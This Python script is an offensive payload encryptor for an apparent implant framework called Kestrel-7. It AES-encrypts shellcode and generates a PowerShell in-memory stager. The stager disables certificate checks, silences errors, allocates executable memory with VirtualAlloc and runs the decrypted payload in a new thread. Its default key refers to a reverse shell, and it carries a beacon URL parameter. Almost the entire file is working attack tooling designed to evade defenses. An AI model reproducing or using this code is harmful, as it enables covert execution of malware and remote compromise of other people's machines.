#!/usr/bin/env python3
"""
encryptor.py - Payload Encryption & Multi-Stager Generation Suite for Kestrel-7
Generates aligned AES-256 / XOR stagers for PowerShell, MSBuild XML, VBScript, and C Arrays.
"""

import os
import sys
import base64
import argparse
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class PayloadEncryptor:
    def __init__(self, key: str):
        self.raw_key = key.encode('utf-8')
        self.key = hashlib.sha256(self.raw_key).digest()
        
    def encrypt_aes(self, data: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00' * 16)
        return cipher.encrypt(pad(data, AES.block_size))
        
    def encrypt_xor(self, data: bytes) -> bytes:
        res = bytearray(data)
        for i in range(len(res)):
            res[i] ^= self.raw_key[i % len(self.raw_key)] ^ (i & 0xFF)
        return bytes(res)

    def generate_c_array(self, encrypted_bytes: bytes, var_name="kestrel_payload") -> str:
        hex_bytes = [f"0x{b:02x}" for b in encrypted_bytes]
        lines = []
        for i in range(0, len(hex_bytes), 12):
            lines.append("    " + ", ".join(hex_bytes[i:i+12]))
        content = ",\n".join(lines)
        return f"const unsigned char {var_name}[{len(encrypted_bytes)}] = {{\n{content}\n}};\nconst unsigned int {var_name}_len = {len(encrypted_bytes)};\n"

    def generate_powershell(self, raw_bytes: bytes, c2_url="https://192.168.1.100/beacon") -> str:
        enc = self.encrypt_aes(raw_bytes)
        b64 = base64.b64encode(enc).decode('utf-8')
        key_hex = self.key.hex()
        
        return f'''# Kestrel-7 Memory-Only Reflective In-Memory Stager
$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}

$b64 = "{b64}"
$encBytes = [System.Convert]::FromBase64String($b64)

# AES-256-CBC Decrypt
$sha = [System.Security.Cryptography.SHA256]::Create()
$keyBytes = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("{self.raw_key.decode()}"))
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $keyBytes
$aes.IV = New-Object byte[] 16

$dec = $aes.CreateDecryptor()
$plainBytes = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)

# VirtualAlloc and Memory Execution
$pinvoke = @"
using System;
using System.Runtime.InteropServices;
public class Win32K7 {{
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}}
"@
Add-Type -TypeDefinition $pinvoke -Language CSharp
$addr = [Win32K7]::VirtualAlloc([IntPtr]::Zero, $plainBytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($plainBytes, 0, $addr, $plainBytes.Length)
$hThread = [Win32K7]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[Win32K7]::WaitForSingleObject($hThread, 0xFFFFFFFF)
'''

def main():
    parser = argparse.ArgumentParser(description="Kestrel-7 Stager Encryptor")
    parser.add_argument('--input', '-i', required=True, help="Input shellcode / binary path")
    parser.add_argument('--key', '-k', default='Kestrel7_Win11_RevShell_2026', help="Encryption key")
    parser.add_argument('--format', '-f', choices=['b64', 'hex', 'c', 'ps1'], default='ps1')
    parser.add_argument('--output', '-o', help="Output file path")
    args = parser.parse_args()
    
    if not os.path.exists(args.input):
        print(f"[-] Input file not found: {args.input}")
        sys.exit(1)
        
    with open(args.input, 'rb') as f:
        raw_data = f.read()
        
    enc = PayloadEncryptor(args.key)
    
    if args.format == 'ps1':
        out_content = enc.generate_powershell(raw_data)
    elif args.format == 'c':
        out_content = enc.generate_c_array(enc.encrypt_aes(raw_data))
    elif args.format == 'b64':
        out_content = base64.b64encode(enc.encrypt_aes(raw_data)).decode('utf-8')
    elif args.format == 'hex':
        out_content = enc.encrypt_aes(raw_data).hex()
        
    if args.output:
        with open(args.output, 'w') as f:
            f.write(out_content)
        print(f"[+] Written formatted output to {args.output}")
    else:
        print(out_content)

if __name__ == '__main__':
    main()
